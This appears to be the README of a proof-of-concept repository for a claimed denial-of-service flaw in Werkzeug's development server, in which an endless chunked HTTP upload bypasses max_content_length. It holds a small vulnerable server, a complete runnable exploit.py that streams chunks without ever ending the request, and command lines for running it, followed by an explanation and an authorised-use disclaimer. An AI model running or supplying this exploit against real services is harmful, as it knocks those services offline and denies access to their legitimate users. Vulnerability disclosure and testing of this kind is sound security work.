# Werkzeug WSGI Chunked Upload DoS PoC

Proof of Concept for a denial-of-service (DoS) vulnerability in Werkzeug’s WSGI request handling that allows bypassing the max_content_length limit, causing servers to hang when processing infinite or excessively large HTTP request bodies.


This repository demonstrates a **Denial of Service (DoS)** vulnerability in Werkzeug’s WSGI server related to handling chunked HTTP uploads.

By sending an infinite chunked POST request, an attacker can cause the server to hang indefinitely, bypassing the `max_content_length` protection.

---

## Server

A minimal Werkzeug server exposing an `/upload` endpoint:

```python
from werkzeug.wrappers import Request, Response
from werkzeug.serving import run_simple

@Request.application
def application(request):
    if request.path == "/upload":
        data = request.get_data()
        return Response(f"Received {len(data)} bytes\n", mimetype="text/plain")
    return Response("Hello World\n", mimetype="text/plain")

if __name__ == "__main__":
    print("Starting Werkzeug server on http://0.0.0.0:5000")
    run_simple("0.0.0.0", 5000, application)
```
Exploit Code (exploit.py)
This script sends an HTTP chunked POST request with an infinite stream of data chunks, causing the server to hang.

```python
import socket
import sys
import time

def send_chunk(sock, data: bytes):
    chunk_size = f"{len(data):X}\r\n".encode()
    sock.sendall(chunk_size + data + b"\r\n")

def send_chunked_request(host, port, path, infinite=False, chunk_data=b'a'*1024, max_chunks=100):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    sock.sendall(headers.encode())

    count = 0
    try:
        while True:
            send_chunk(sock, chunk_data)
            count += 1
            print(f"[+] Sent chunk #{count} ({len(chunk_data)} bytes)")
            if not infinite and count >= max_chunks:
                break
            time.sleep(0.1)
        sock.sendall(b"0\r\n\r\n")
        print("[+] Sent last chunk (0-length) to close request")
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"[!] Exception: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: python {sys.argv[0]} <host> <port> <path> [infinite]")
        print("Example: python exploit.py 127.0.0.1 5000 /upload infinite")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    path = sys.argv[3]
    infinite = len(sys.argv) > 4 and sys.argv[4].lower() == "infinite"

    send_chunked_request(host, port, path, infinite=infinite)
```

##Usage
Run the vulnerable Werkzeug server:
```bash
python werkzeug_server.py
```
In another terminal, run the exploit against the server:
```bash
python exploit.py 127.0.0.1 5000 /upload infinite
```


Uploading dos-server.mp4…



This will send an infinite HTTP chunked upload request causing the server to hang, demonstrating the DoS vulnerability.
Explanation
The Werkzeug server reads all the incoming chunked request data with request.get_data().

The exploit sends an infinite stream of chunked data (never sending the terminating zero-length chunk).

Werkzeug's max_content_length protection is bypassed because the server keeps waiting for the end of the chunked stream, which never arrives.

This causes the server to hang indefinitely, leading to a Denial of Service.

#Impact
Remote attacker can send crafted chunked uploads that hang the server.

Denies legitimate clients access to the server.

Could be exploited for DoS attacks on services using Werkzeug WSGI server without additional protections.

#Disclaimer
Use this code only in environments you own or have explicit permission to test. Do not attack unauthorized systems.

#Notes
1.This is for educational and testing purposes only.

2.Werkzeug's built-in server is a development server and not meant for production.

3.Real-world WSGI servers or frameworks may have mitigations or behave differently.




